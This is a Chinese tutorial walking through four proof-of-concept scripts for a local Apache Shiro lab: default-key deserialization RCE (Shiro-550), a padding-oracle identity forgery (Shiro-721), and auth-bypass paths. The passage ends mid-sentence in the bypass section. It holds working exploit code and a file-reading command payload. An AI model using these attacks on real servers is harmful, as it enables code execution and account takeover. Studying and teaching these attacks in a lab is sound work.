# Shiro 靶场 · 四个复现脚本逐行讲解

这份文档讲的是 `shiro/poc/` 下的四个文件：

- `aes.py` —— 手写的 AES-128-CBC，只实现加密方向
- `shiro550_exp.py` —— 默认密钥 + CC6 反序列化
- `shiro721_exp.py` —— padding oracle 伪造任意身份（最难的一份，占的篇幅也最大）
- `bypass_exp.py` —— 路径绕过的版本对照实验

读法建议：**先把四个脚本各跑一遍**，再回来看这里。文档里引用的输出、字节数、
耗时都是在本仓库镜像上真实跑出来的，不是"应该会这样"。

原理（为什么 550 成立、为什么 721 需要 oracle、四个 CVE 的根因）在
`shiro/README.md`，本文只讲**代码怎么把它实现出来**。

---

## 0. 先看清它和靶场的分工

四个脚本都跑在宿主机上，靶场里有三个"配套设施"是专门给它们准备的。
不先讲清这三个东西，后面看代码会一直有个疑问：**这算不算泄题？**

### 0.1 `/payloads/**` —— 下载序列化原料

映射到容器里的 `/app/payloads/`，是 `LabGen.prepare()` 在 Spring 启动**之前**
写好的两个文件：

- `cc6.bin`（1223 字节）—— `HashMap → TiedMapEntry → LazyMap → ChainedTransformer
  → Runtime.exec` 这条链的序列化字节，命令固定为 `cat /flag > /tmp/out/flag.txt`
- `principal_root.bin`（362 字节）—— `SimplePrincipalCollection` 里装一个 `"root"`

真实攻防里这两样东西是攻击者**在自己机器上**用 ysoserial / 自己写的小程序生成，
不需要目标配合。靶场把它挂在 HTTP 上，纯粹是为了让脚本零依赖、
不用你本地装一套 JDK + ysoserial 才能练习。

**但要清楚代价**：因为 payload 是服务端给的，你改不了里面那条命令。
想换成 `id`、`whoami`，只能改 `LabGen.java` 的 `CMD` 常量再重建镜像。
这不是脚本的限制，是"零依赖"换来的取舍。

### 0.2 `/out/**` —— 取回命令输出

映射到 `/tmp/out/`，容器里权限 777。

550 的 RCE **没有回显**：命令是在反序列化过程中被 `Runtime.exec` 拉起来的，
进程的 stdout 不回到 HTTP 响应里。所以 payload 干的事是
`cat /flag > /tmp/out/flag.txt`，把结果**落到文件**，再由 HTTP 取回来。

这就是真实攻防里的"落文件 / 带外"套路，只不过真实环境通常落到 web 目录
（`uploads/flag.txt`），靶场落到一个显式映射的静态目录，更好找。

### 0.3 `/__oracle` —— 只在 721 模式存在的探针

这是整个靶场唯一"人造"的东西。它返回三个状态码：

- `204` —— 服务端认为填充**合法**（解密成功；后面反序列化成不成功都一样）
- `400` —— 填充**非法**
- `404` —— 这个端口没开 721 模式

为什么需要它：真实环境里 padding 是否合法，只能靠**响应体长度、响应时间、
有没有 deleteMe** 这些侧信道去猜，非常玄学。靶场把它做成一个明确的状态码，
你才能专心练"oracle 拿到一位信息之后，怎么把它变成完整明文"这件事。

真实环境没有这个接口——这一点 `LabState.java` 和 `OracleFilter.java` 的注释里
都写明了，属于**明示的教学简化**，不是漏洞本身。

顺带解释一个容易卡住的疑问：`/__oracle` 在 filter chain 里配的是 `anon`
（不需要登录），那它凭什么能测出 cookie 的填充对不对？

因为 Shiro 的 `AbstractShiroFilter` 会**为每个请求创建一个 Subject**，
建 Subject 的过程中就要解析 rememberMe（把 cookie 解出来还原身份），
这件事发生在执行 filter chain **之前**，跟这条路径是 `anon` 还是 `authc` 无关。
所以哪怕访问一个匿名页面，你的 cookie 也已经被解过了——
把这个结果记下来，就是 oracle。

顺带一提：`X-Lab-Oracle` 这个响应头也是给人看的，脚本**不依赖**它。原因在
第 3.4 节讲。

---

## 1. `aes.py` —— 为什么要自己写一个 AES

### 1.1 动机：不是炫技，是省事

这个仓库所有 POC 一律零第三方依赖，原因很实际：

- 你的机器上 `pip install pycryptodome` 会报
  `error: externally-managed-environment`，得先绕 uv
- CTF 现场 / 别人的机器上装包经常直接失败，`ModuleNotFoundError: No module
  named 'Crypto'` 属于经典浪费时间
- 一旦依赖了第三方库，脚本就不能"复制走就能跑"

所以 AES 用标准库 + 纯 Python 实现，代价是慢——但对 1223 字节的 payload 来说，
慢几毫秒完全无所谓。

### 1.2 为什么只实现"加密"，不实现"解密"

这是很多人第一次看会疑惑的地方。答案很简单：**没人需要解密。**

- 550 需要的是**加密**：拿默认 key 把 CC6 字节加密成 cookie 发给服务端
- 721 全程**不需要 AES**：padding oracle 只做异或和字节翻转，
  密钥是什么、AES 怎么算，完全不知道也不需要知道

所以解密方向的逆 S 盒、逆列混淆、InvMixColumns 一张表都不用写，
代码直接少一半。这是"按需实现"的典型例子。

### 1.3 代码结构

文件按 FIPS-197 的顺序组织，五层：

1. S 盒 + 有限域乘法 —— 字节代换和列混淆的原料
2. `_expand_key()` —— 16 字节密钥扩展成 11 组轮密钥
3. `_encrypt_block()` —— 单块加密
4. `cbc_encrypt()` —— CBC 串联 + PKCS#7 填充
5. `self_test()` —— 用官方向量自检

下面按这个顺序拆。

### 1.4 `SBOX` 和 GF(2^8)

```python
SBOX = [0x63, 0x7c, 0x77, ...]   # 256 个值，16 行 × 16 列
```

S 盒的定义是"GF(2^8) 上的乘法逆元 + 仿射变换"，但**实现上从来不算**，
标准做法就是查表。这张表按行读，就是 FIPS-197 Figure 7 的那张。

`_xtime(a)` 是 GF(2^8) 里"乘 2"：

```python
a <<= 1
if a & 0x100:      # 溢出 8 位
    a ^= 0x11b     # 异或不可约多项式 x^8+x^4+x^3+x+1
return a & 0xff
```

为什么要异或 `0x11b`：在 GF(2) 上，多项式乘法溢出后要对不可约多项式取模，
而 AES 选的是 `x^8 + x^4 + x^3 + x + 1`，二进制就是 `1 0001 1011`。
这是定义，记住就行；`0x1b` 就是低位那部分。

`_gmul(a, b)` 是通用的 GF(2^8) 乘法，用俄罗斯农民乘法（一路翻倍 + 按位累加），
只为在模块加载时**预计算**两张表：

```python
MUL2 = [_gmul(i, 2) for i in range(256)]
MUL3 = [_gmul(i, 3) for i in range(256)]
```

列混淆里只用到乘 2 和乘 3，预计算成表比每轮现算快一个数量级。

### 1.5 `_expand_key()`

AES-128 的密钥扩展规则：把 16 字节密钥看成 4 个 32 位字，
一路扩展到 44 个字（4 个初始 + 40 个扩展），每 4 个字拼成一组轮密钥，
共 11 组（第 0 组用于初始 AddRoundKey）。

```python
w = [list(key[i * 4:(i + 1) * 4]) for i in range(4)]   # 4 个字
for i in range(4, 44):
    temp = list(w[i - 1])
    if i % 4 == 0:                    # 每第 4 个字要特殊处理
        temp = temp[1:] + temp[:1]    # RotWord：循环左移一字节
        temp = [SBOX[b] for b in temp]  # SubWord：每个字节过 S 盒
        temp[0] ^= RCON[i // 4 - 1]   # 异或轮常量
    w.append([w[i - 4][j] ^ temp[j] for j in range(4)])
```

- `i % 4 != 0` 的字：`w[i] = w[i-4] XOR w[i-1]`，就是两行异或
- `i % 4 == 0` 的字：先对 `w[i-1]` 做 RotWord + SubWord + Rcon，再异或 `w[i-4]`

最后一步把 44 个字切成 11 组、每组展平成 16 字节：

```python
return [sum(w[r * 4:(r + 1) * 4], []) for r in range(11)]
```

`sum(嵌套列表, [])` 是 Python 里展平列表的老技巧——用空列表做初值，
`[] + [a] + [b] + [c] + [d]` 就拼成一个新列表。

`RCON` 只有 10 个值，因为 AES-128 只扩展 10 轮：

```python
RCON = [0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36]
```

从 `0x80` 到 `0x1b` 那一步就是"乘 2 溢出后取模"，和 `_xtime` 同一个道理。

### 1.6 `_shift_rows()` —— 一个容易写错的下标

AES 的状态矩阵**按列存**，不是按行：

```
state[r][c] = s[r + 4*c]
```

也就是说 `s[0..3]` 是第一列，`s[4..7]` 是第二列。ShiftRows 的规则是
"第 r 行循环左移 r 格"，写成代码：

```python
out[r + 4 * c] = s[r + 4 * ((c + r) % 4)]
```

第 r 行第 c 列的新值，来自同一行第 `(c+r) mod 4` 列。

如果你按"行优先"去写（`s[4*r + c]`），`self_test()` 会立刻告诉你错了——
这正是自检存在的意义。

### 1.7 `_mix_columns()`

每一列当成 GF(2^8) 上的 4 元多项式，乘一个固定矩阵：

```
[02 03 01 01]
[01 02 03 01]
[01 01 02 03]
[03 01 01 02]
```

展开成四行代码就是：

```python
out[4*c + 0] = MUL2[a0] ^ MUL3[a1] ^ a2 ^ a3
out[4*c + 1] = a0 ^ MUL2[a1] ^ MUL3[a2] ^ a3
out[4*c + 2] = a0 ^ a1 ^ MUL2[a2] ^ MUL3[a3]
out[4*c + 3] = MUL3[a0] ^ a1 ^ a2 ^ MUL2[a3]
```

`MUL2[x]` 就是 `02 · x`，`MUL3[x]` 是 `03 · x`，系数 `01` 直接就是原值。

### 1.8 `_encrypt_block()` —— 轮函数

```python
s = [block[i] ^ round_keys[0][i] for i in range(16)]   # 初始 AddRoundKey

for rnd in range(1, 11):
    s = [SBOX[b] for b in s]          # SubBytes
    s = _shift_rows(s)                # ShiftRows
    if rnd != 10:                     # 第 10 轮没有列混淆
        s = _mix_columns(s)
    s = [s[i] ^ round_keys[rnd][i] for i in range(16)]   # AddRoundKey
```

四步循环 10 次，**第 10 轮跳过 MixColumns**。这个"少一轮"是 AES 规范规定的，
不是优化，写掉了自检就过不去。

### 1.9 `pkcs7_pad()` / `cbc_encrypt()` / `shiro_encrypt()`

填充：

```python
def pkcs7_pad(data, block_size=16):
    n = block_size - len(data) % block_size
    return data + bytes([n]) * n
```

注意一个容易忽略的点：**长度刚好是 16 的倍数时，`n` 会是 16，补一整块**。
这是 PKCS#7 的规定（否则没法区分"最后一块是数据"和"最后一块是填充"）。
362 字节的 principal：`362 % 16 = 10`，所以补 `16-10 = 6` 个 `0x06`，共 368 字节。

CBC 串联：

```python
prev = iv
for i in range(0, len(data), 16):
    block = bytes(a ^ b for a, b in zip(data[i:i+16], prev))
    prev = _encrypt_block(block, round_keys)
    out += prev
return bytes(out)          # 不含 iv
```

每块先和"前一块密文"异或，再加密。第一块异或的是 IV。
返回值**不含 IV** —— 因为 Shiro 的 cookie 格式是 `IV || 密文`，
拼装的事交给外层：

```python
def shiro_encrypt(key_b64, plaintext):
    key = base64.b64decode(key_b64)
    if len(key) != 16:
        raise ValueError("key 解码后不是 16 字节：%s" % key_b64)
    iv = os.urandom(16)                                   # 每次随机
    return base64.b64encode(iv + cbc_encrypt(key, iv, plaintext)).decode()
```

这三个细节和 Shiro 的 `AesCipherService` 默认参数一一对应：

- `AES/CBC/PKCS5Padding`
- 128 位密钥（所以 key 必须是 16 字节）
- 每次随机 IV，**IV 明文拼在密文前面**
- 整体做标准 Base64（不是 URL-safe 字母表）

`iv + 密文` 这个格式是后面 721 攻击的物理基础：我们能控制 IV，
就等于能控制第一块的明文。

### 1.10 `self_test()` —— 为什么值得写

两个官方向量：

- **FIPS-197 附录 C.1**：单块加密
  key `000102...0f`、plain `00112233...ff` → cipher `69c4e0d86a7b0430d8cdb78070b4c55a`
- **NIST SP 800-38A F.2.1**：CBC 模式前两块
  → `7649abac8119b246cee98e9b12e9197d5086cb9b507219ee95db113a917678b2`

跑一下就知道有没有写错：

```bash
$ python3 poc/aes.py
[+] AES-128-CBC 自检通过（FIPS-197 C.1 + SP 800-38A F.2.1）
```

为什么值得写：手写密码学代码最常见的错法是"下标差一位"，而症状是
"加密出来的东西服务端永远不认"。有了官方向量，你可以确信问题不在 AES 这一层，
省掉一整轮排查。这也是 550 脚本能一开始就在第 6 个 key 上命中的原因——
AES 没错，剩下的只是字典。

---

## 2. `shiro550_exp.py`

### 2.1 一句话原理

Shiro 1.2.4 的 rememberMe 密钥是写死的常量 `kPH+bIxk5D2deZiIxcaaaA==`；
服务端收到 cookie 后 **Base64 解码 → AES 解密 → 直接 `readObject()`**，
中间没有完整性校验、没有类白名单。于是"用默认密钥加密一段 CC6 序列化数据"
就等于命令执行。

### 2.2 整体流程

1. 探活：GET `/`，连不上直接给可读的报错
2. 指纹：发一个随便的 `rememberMe`，看服务端有没有回 `rememberMe=deleteMe`
3. 取 payload：GET `/payloads/cc6.bin`
4. 逐个 key：`aes.shiro_encrypt(key, payload)` → 发出去 → 等 150ms → 取 `/out/flag.txt`
5. 命中就打印 key、耗时、flag

### 2.3 逐函数

**`opener()` / `OPENER`**

```python
def opener():
    return urllib.request.build_opener(urllib.request.ProxyHandler({}))
```

`urllib` 默认会读 `http_proxy` / `https_proxy` 环境变量。打本地靶场时
如果系统里配了代理（或者你开着 Charles / Clash），请求会被转走，
表现是"连不上 127.0.0.1"。传一个空的 `ProxyHandler({})` 等于显式禁用代理。

**`http()`** —— 一个统一出口，把三种结果都压成 `(status, body, headers)`：

```python
try:
    with OPENER.open(req, timeout=timeout) as r:
        return r.status, r.read(), dict(r.headers)
except urllib.error.HTTPError as e:      # 4xx/5xx 也是"有响应"，不算异常
    return e.code, e.read(), dict(e.headers)
except Exception as e:                   # 连不上
    return 0, str(e).encode(), {}
```

用 `status == 0` 表示"连不上"，是个很实用的约定：后面所有调用方只要判断
`status == 0` 就知道是网络问题，不用去 catch 一堆异常类型。

`urllib.error.HTTPError` 要单独接住：它既是异常也是响应，`e.code` 和 `e.read()`
都拿得到。不接的话 404 会直接抛出来。

**`load_keys()`**

```python
if len(base64.b64decode(line)) != 16:
    continue
```

为什么要过滤：Shiro 默认密钥是 128 位，Base64 解码后必须正好 16 字节。
`keys.txt` 里有些串看起来很像 key（比如 `ZUdsaGJuSmxibVI2ZHc9PQ==`），
解码后是 16 字节的"再一层 base64 文本"，能用；但更多流传的串是 24/32 字节，
AES-192/256 的 key 在 Shiro 这个默认配置下用不上，试了只会白等 150ms。

**`fetch_payload()`**

```python
status, body, _ = http(base, "/payloads/cc6.bin")
if status != 200 or len(body) < 100:
    raise SystemExit("[x] 取不到 ... 确认靶场已经起来，并且 --lab.mode=550。")
```

`len(body) < 100` 这个下限是防御性的：如果映射配错了，Spring 可能返回一个
200 但内容是空或者错误页，光看状态码判断不出来。

**`fingerprint()`**

```python
status, _, headers = http(base, "/", cookie="AAAAAAAAAAAAAAAAAAAAAA==")
raw = " ".join("%s: %s" % (k, v) for k, v in headers.items())
return DELETE_ME in raw
```

`"AAAAAAAAAAAAAAAAAAAAAA=="` 是 22 个 A 加 `==`，解码正好 16 字节，
长度合法但内容不是真 key。服务端解密失败 → 走 `forgetIdentity()` →
回一个 `Set-Cookie: rememberMe=deleteMe`。

这个特征之所以可靠：它是 Shiro 的**默认行为**，不是靶场加的。
真实渗透里这一步对应指纹识别（fofa、`whatweb`、看 `Set-Cookie`）。

把 header 拼成一个大字符串再 `in` 判断，是为了不用关心大小写和具体哪一行
（`dict(r.headers)` 的 key 大小写依服务器而定）。

### 2.4 main() 里两个值得记的点

**为什么 `--delay` 默认 0.15**

```python
http(base, "/", cookie=cookie)
time.sleep(args.delay)
st, body, _ = http(base, "/out/flag.txt")
```

`Runtime.exec` 是**异步**的：JVM 把命令丢给子进程就返回了，HTTP 响应已经发完，
`cat /flag > /tmp/out/flag.txt` 可能还没写完。不等这一下，
查文件查到的是**上一个 key** 的成果。

症状很具体：命中位置比真实 key 靠后一位。第一次跑我把答案记成了第 7 个
`wGiHplamyXlVB11UXWol8g==`，其实第 6 个 `kPH+bIxk5D2deZiIxcaaaA==` 才是。

**为什么命中不是第 1 个**

`keys.txt` 里的顺序是刻意打乱的，第一行 `2AvVhdsgUs0FSA3SDFAdag==` 不是答案。
真按"默认 key 放第一个"写，脚本就变成"第 1 个就命中"，
看不出爆破这件事本身——你会以为它是从一开始就知道答案的。

### 2.5 自己改造它

- 想换 key：`--key <base64>` 单测一个，跳过字典
- 想换字典：`--keys my.txt`，一行一个，`#` 开头是注释
- 想换命令：改 `LabGen.java` 里的 `CMD` 常量，`docker compose build shiro-550` 重建
- 想换 gadget：`/payloads/cc6.bin` 是服务端给的，换链子要么改 `LabGen`，
  要么自己也装 ysoserial 生成一份、把 `fetch_payload()` 换成读本地文件

---

## 3. `shiro721_exp.py` —— 重点

这份脚本最长，也最容易看错。建议顺序：**先看 3.1 的三个公式，再看 3.5 的
`recover_one`，最后看 3.8 的 `forge`**。

### 3.1 前置：CBC 的三个公式

设密钥固定，`E()` 是 AES 加密，`D()` 是 AES 解密（对单块）。

解密：

```
P(i) = C(i-1) XOR D(Ci)          # 第 i 块的明文
```

其中 `C(0)` 就是 IV。

从这条能推出两件事，整个攻击都建立在这上面：

1. **改 `C(i-1)` 的某个字节，只影响 `P(i)` 的同一个字节**，一对一。
2. 改 `C(i-1)` 不会影响 `P(i+1)`（解密 `P(i+1)` 只需要 `Ci` 和 `D(Ci+1)`）。

还有一件事需要知道：服务端解完最后一块要校验 PKCS#7 填充，
**填充对不对，服务端的反应不一样**。这个"不一样"就是 oracle。

### 3.2 攻击目标：从"能测填充"到"能控制明文"

oracle 一次只回答一个比特：这次填充对不对。

但配合公式 1，就能把它变成"能问出任意字节"：

- 想求出 `D(Ci)` 的第 j 个字节，就反复改 `C(i-1)` 的第 j 字节
- 让前面已知的字节先满足某个填充值（比如要凑 `0x02 0x02`）
- 猜 0x00 到 0xff，哪个让服务端说"填充合法"，那个就是 `D(Ci)[j] XOR pad_value`

求出 `D(Ci)` 之后，公式 1 反过来用：

```
C(i-1) = D(Ci) XOR 目标明文块
```

我们就能把第 i 块明文**改成任意内容**，全程不需要密钥。

### 3.3 为什么"只发两块"（第一个关键点）

服务端只校验**最后一块**的填充。

如果老老实实把整条 25 块的 cookie 发过去，然后去改 `C(i-1)` 想影响 `P(i)`——
最后一块 `P(25)` 的填充压根没被动过，所以**不管猜什么值，服务端都说合法**。

第一次跑的症状：`D` 全错，但自检还能过。因为自检恰好动的是最后一块
（`recover_middle(blocks[n])`），那里是真的在测最后一块。

正解是把密文截成两块发出去：

```python
return guess, oracle(bytes(cand) + bytes(blocks[_i]))
```

`cand`（16 字节）当 IV 用，`blocks[i]`（16 字节）是被解密的那块。
总共 32 字节 = 两块，`blocks[i]` 成了"最后一块"，填充校验才对准我们的目标。

**这是全脚本最反直觉的一行。** 记住它：每次都只发两块。

### 3.4 为什么判定走状态码，不走响应头

```python
if status == 204:
    return True
if status == 400:
    return False
if status == 404:
    raise SystemExit("[x] /__oracle 返回 404：这个端口没开 721 模式 ...")
```

第一版是用 `X-Lab-Oracle` 响应头判定的，结果是并发一高就随机丢头，
报"目标没有返回 X-Lab-Oracle 头"。

根因：头要在 filter 里补，而 `/__oracle` 一旦返回 204，容器可能立刻把响应
commit 掉，之后 `response.setHeader()` 静默失效。单线程偶尔能过，
多线程必挂。

改成"由 controller 直接写状态码"之后彻底稳定——因为状态码是响应的一部分，
不存在"补不上"的问题。头还留着，但只给人看（`curl -i` 时舒服一点），
脚本不依赖。

**这条经验可以迁移**：给自动化脚本做判定通道时，优先选响应里**本质的**部分
（状态码、body 字节数），别选"事后补的"部分（自定义头）。

另外三个细节：

```python
for _ in range(3):          # 最多重试 3 次
    ...
    except Exception:
        _drop_conn()        # 连接坏了就丢掉，下次重建
        continue
    ...
    # 500 之类的服务端异常：重试，别急着判定
```

`500` 不当作 `False`。反序列化炸穿 Shiro 的 catch 时服务端可能回 500，
如果把它当"填充非法"，就会把一个真实的合法性判定成非法，整块算错。

### 3.5 `recover_one()` —— 求第 i 块的中间值

这是核心函数，17 行有效代码，逐段看。

**外层循环：从最后一个字节往前**

```python
known = bytearray(BLOCK)                  # 存 D(Ci)，未知先当 0
for j in range(BLOCK - 1, -1, -1):        # j = 15, 14, ..., 0
    pad_value = BLOCK - j                 # j=15 → 1，j=0 → 16
```

为什么要倒着来：填充是**从尾部往前**构成的。
要凑出 `0x01` 的填充，只需要控制最后一个字节；
要凑出 `0x02 0x02`，得先知道最后一个字节，再去控倒数第二个。
所以顺序必须是 15 → 0，`pad_value` 随之 1 → 16。

**构造"前缀"**

```python
base = bytearray(blocks[i - 1])
for k in range(j + 1, BLOCK):
    base[k] = known[k] ^ pad_value
```

对已经求出来的字节（`j+1 .. 15`），把 `C(i-1)[k]` 设成 `D[k] XOR pad_value`，
这样 `P(i)[k] = D[k] XOR C(i-1)[k] = pad_value`。
也就是"已解出的部分先摆成我们要的填充形状"。

**猜一个字节**

```python
def probe(guess, _base=base, _j=j, _i=i):
    cand = bytearray(_base)
    cand[_j] = guess
    return guess, oracle(bytes(cand) + bytes(blocks[_i]))
```

两个语法点：

- `_base=base, _j=j, _i=i` 把循环变量"钉"成默认参数。这是 Python 闭包的经典
  防御写法——如果写成纯闭包 `lambda: oracle(... j ...)`，一旦有人把
  `pool.map` 改成"先收集任务、循环结束再执行"，所有任务都会读到最后一次的 `j`。
  这里 `map` 在当前轮就消费完了，其实不会错位；但钉住参数以后，
  以后怎么改都不会踩坑。
- `oracle()` 是 IO，用线程池并发扫 256 个猜测值。`workers=1` 时就是纯串行，
  一次 256 个请求。

**选哪个命中值（假阳性）**

```python
hits = []
for guess, ok in _get_pool(workers).map(probe, range(256)):
    if ok:
        hits.append(guess)
```

理论上每个字节只有一个猜测值能让填充合法（数学上唯一）。
但 **`j == 15` 这一轮是例外**，会同时出现两个候选。

原因是此时还没有"已解出的字节"来锁定填充长度。`pad_value` 本该是 `0x01`，
可如果猜出来的值让 `P(15) = 0x02`，而 `P(14)` 原本**恰好也是 `0x02`**，
那服务端看到的是一条长度为 2 的合法填充，一样回答"合法"。于是有两个命中。
（理论上还能撞上 `0x03 0x03 0x03`，概率极低但存在。）

区分办法：**把 `P(j-1)` 翻一位，再问一次**。

```python
verify = bytearray(base)
verify[j] = guess
verify[j - 1] ^= 0x01
if oracle(bytes(verify) + bytes(blocks[i])):
    chosen = guess
    break
```

判断依据只有一条——`P(j-1)` 在不在填充范围内：

- 填充长度正好等于 `pad_value`：`P(j-1)` 在填充范围**之外**，翻它不影响填充 → 仍然合法
- 填充长度比 `pad_value` **长**（假阳性）：`P(j-1)` 在填充范围**之内**，翻它 → 非法

所以"改了一位还合法"就证明我们凑的填充长度是对的，这个候选可信。

`j == 0` 时没有 `j-1` 可翻，直接取第一个命中——此时 `pad_value = 16`，
16 已经是填充长度上限，不存在"更长"的假阳性。

**为什么还要串行复核两次**

```python
for _ in range(2):
    cand = bytearray(base)
    cand[j] = chosen
    if not oracle(bytes(cand) + bytes(blocks[i])):
        raise SystemExit("[x] 第 %d 块第 %d 字节复核不通过：oracle 在并发下不稳定。")
```

并发扫的时候偶发误判会把假阳性当成真值。结果就是"23 块全对，
偏偏某一块错一个字节"，然后反序列化直接崩、`/admin` 一路 302。

这种错**静默发生**、最难查：你看到的只是"伪造失败"，看不出是哪一块错。
宁可多花两次请求，把它挡在源头。

**记下中间值**

```python
known[j] = chosen ^ pad_value
```

因为 `P(j) = D[j] XOR C(i-1)[j]`，而我们刚让 `P(j) = pad_value`，
所以 `D[j] = C(i-1)[j] XOR pad_value` = `chosen XOR pad_value`。

### 3.6 `recover_middle()` —— 用它解密单独一块

```python
def recover_middle(block, workers, progress=None):
    blocks = [bytearray(BLOCK), bytearray(block)]
    return recover_one(blocks, 1, workers, progress or (lambda *a: None))
```

把目标块放在"最后一块"的位置，前面随便给一个 16 字节的 IV（全 0 也行，
反正我们要的是 `D`，不是明文），然后复用 `recover_one`。

这就是 padding oracle 最原始的用法：**只解密一个块**。
`recover_one` 里那个 `i-1` 的下标，在这里正好指向那个全 0 的 IV。

### 3.7 为什么不能"复用原 cookie 的中间值"（第二个关键点）

这是 721 最容易想错、也最耗时间的地方，单独说。

直觉上会这么想：原 cookie 有 25 块，我已经爆出了每块的 `D(Ci)`，
那直接 `C(i-1) = D(Ci) XOR 目标块` 拼一条新的不就行了？

**不行。** 原因：拼出来的块是**新块**，服务端解密它时用的是新块自己的中间值，
那个值我们从来没算过。拿原块的 `D` 去套新块，解出来是乱码。

我第一次跑就卡在这里，症状特别迷惑：

- padding 合法（最后一块确实是好的）
- 但 `/admin` 一路 302
- 加 `--lab.debug=true` 打印真实 AES key，用 `openssl` 直接加密
  `principal_root.bin` → HTTP 200，说明 **payload 本身没问题**

问题只在"新块的 `D` 从哪来"。正确答案：**每造一块，就现场爆一次它自己的中间值**。

### 3.8 `forge()` —— 逐块倒着造

```python
pad = BLOCK - len(payload) % BLOCK
body = payload + bytes([pad]) * pad
k = len(body) // BLOCK
chunks = [body[i * BLOCK:(i + 1) * BLOCK] for i in range(k)]

cur = bytearray(os.urandom(BLOCK))     # 先随便来一块，当"最后一块"
chain = []
for i in range(k - 1, -1, -1):
    middle = recover_middle(cur, workers)          # 爆这一块的 D
    chain.insert(0, bytes(cur))
    cur = bytearray(a ^ b for a, b in zip(middle, chunks[i]))
return bytes(cur) + b"".join(chain)
```

用具体数字走一遍（payload 362 字节 → 补 6 个 `0x06` → 368 字节 → 23 块）：

1. `cur` = 随机 16 字节，它将作为整条密文的**最后一块 `C23`**
2. 爆出 `D(cur)`，也就是 `D(C23)`；把 `cur` 放进链子尾部
3. 取最后一块明文 `chunks[22]`（代码 0 起始，就是第 23 块），
   令 `cur = D(C23) XOR chunks[22]`，这 16 字节成为 **`C22`**
   —— 因为解密 `C23` 时 `P(23) = C22 XOR D(C23)`，正好等于第 23 块明文
4. 下一轮 `i = 21`：爆 `D(C22)`，令 `cur = D(C22) XOR chunks[21]`，得到 `C21`，依此类推
5. 循环 23 次后所有明文块都消费完，`cur` 变成 IV，链子里是 `C1..C23`
6. 返回 `IV || C1..C23` = 16 + 368 = 384 字节

关键点：**每一轮的 `cur` 都是新块，所以每一轮都必须重新爆一次它的 `D`**。
不能省，这是本节 3.7 的结论在代码里的落地。

代价：`k 块 × 16 字节 × 256 次请求`。368 字节就是 23 × 4096 ≈ 9.4 万次请求，
实测 50.6 秒（每块 2.2 秒）。payload 越大越慢，这就是真实 721 利用
经常要跑几十分钟、实战价值有限的原因。

### 3.9 main() 的五个步骤

**① 先确认端口真的会吐 oracle**

```python
r = request("GET", "/__oracle")
boot = r.status
if boot == 404:
    raise SystemExit("[x] /__oracle 返回 404：这个端口没开 721 模式，确认打的是 8902。")
```

先花一次请求问清楚，别等爆破到一半才发现打错靶场。这是所有攻击脚本都该有的
习惯：**前置检查放在最前面**。

**② 正常登录，拿一个合法 cookie**

```python
body = urllib.parse.urlencode({
    "username": username, "password": password, "rememberMe": "1",
}).encode()
r = request("POST", "/login", body=body, headers={...})
```

然后从 `Set-Cookie` 里挑出 `rememberMe=`，**跳过 `rememberMe=deleteMe`**：

```python
if first.startswith("rememberMe=") and first != "rememberMe=deleteMe":
    raw = first[len("rememberMe="):]
    return base64.b64decode(raw)
```

这个判断不能少：登录失败时服务端也会回一个 `rememberMe=deleteMe`，
不排除的话后面会把 9 个字符当成密文去爆。

实测这条 cookie 是 416 字节 = IV(16) + 25 块密文。

**③ 自检 oracle 真的可用**

```python
d_last = recover_middle(blocks[n], args.workers)
probe_iv = bytearray(a ^ 0x10 for a in d_last)
if not oracle(bytes(probe_iv) + bytes(blocks[n])):
    raise SystemExit("[x] 自检失败：把最后一块改成纯填充，oracle 却说填充非法。")
```

思路：已经知道最后一块的 `D` 了，那令 `IV = D XOR 0x10`，
解出来的明文就是 16 个 `0x10` —— 一个完全合法的填充。
服务端必须说"合法"。

如果它说非法，只有两种可能：判定条件反了，或者服务端不是这个实现。
这一步能在正式爆破前把"oracle 判反"这种低级错误挡掉。

**④ 逐块造密文**（3.8）

进度条用 `\r` 覆盖同一行：

```python
sys.stdout.write("\r    正在造第 %d/%d 块密文   已用 %.1fs" % (...))
sys.stdout.flush()
```

`flush()` 不能省，否则输出被缓冲，你会盯着一个空屏幕怀疑人生。

**⑤ 拿去打 `/admin`**

```python
r = request("GET", "/admin", headers={"Cookie": "rememberMe=" + b64})
...
if "FLAG{" in body:
    print("[+] flag：%s" % body[start:end + 1])
```

注意这里用的是**登录后的会话吗？不是**。伪造的 cookie 自带身份，
不需要先登录。`/admin` 在 721 模式下挂的是 `user` 过滤器
（`isAuthenticated() || isRemembered()`），所以"只有 rememberMe 身份"也能进。

如果没拿到 flag，脚本会打三段诊断信息：oracle 原始判定、首页身份区、响应片段。
这几段是调试用的，别删——"伪造失败"最难查的就是"到底哪一步没对上"。

### 3.10 调参建议

- `--workers 1`（默认）：最稳，50 秒左右
- `--workers 4`：快，但 oracle 不稳时会误判，脚本的复核会拦住一部分
- 出现 `[x] 第 x 块第 y 字节复核不通过` → 调小 workers 重跑
- 出现"跑到一半随机失败" → 多半是本机端口耗尽了，`workers` 太大

`_get_pool()` 保证了整个攻击只建一个线程池：

```python
global _POOL
if _POOL is None:
    _POOL = ThreadPoolExecutor(max_workers=workers)
```

每次爆破字节都新建池的话，线程和它们持有的长连接全被丢弃，
几万次请求下来本机端口会被耗光（TIME_WAIT 堆积），
表现就是"跑着跑着 oracle 没了"。

`_conn()` 用 `threading.local()` 给每个线程留一条复用连接：

```python
c = getattr(_local, "c", None)
if c is None:
    c = http.client.HTTPConnection(HOST, PORT, timeout=15)
    _local.c = c
return c
```

为什么不用 `urllib`：每次请求都重新 TCP 握手 + 关闭，9.4 万次请求会慢一个数量级。
padding oracle 是 IO 密集型的暴力活，连接复用是必须的优化，不是微调。

---

## 4. `bypass_exp.py`

### 4.1 它不是利用脚本，是对照实验

550 和 721 都是"打进去拿 flag"。这个脚本的目的不是拿 flag，
是**把同一批 payload 打到四个版本上，看反应怎么变**。

判定三态（`verdict()`）：

```python
if status == 0:                     return "ERR"
if status == 200 and "FLAG{" in body: return "BYPASS"
if status in (301, 302, 303, 307):  return "302"
if status == 200:                   return "200"
return str(status)
```

为什么 `BYPASS` 要求"200 且 body 里有 FLAG{"：只看 200 不够。
1.4.2 上 `/xxx/..;/admin` 返回 200 但内容是错误页，
严格来说"鉴权绕过了，但没打到 controller"，不能算完整绕过。

### 4.2 两个函数

**`probe()`** —— 一次性请求，所以 `Connection: close`：

```python
conn = http.client.HTTPConnection(host, port, timeout=6)
conn.request("GET", path, headers={"Connection": "close"})
```

和 721 的选择正好相反：那边是 9 万次请求，必须复用；这边是 64 次请求，
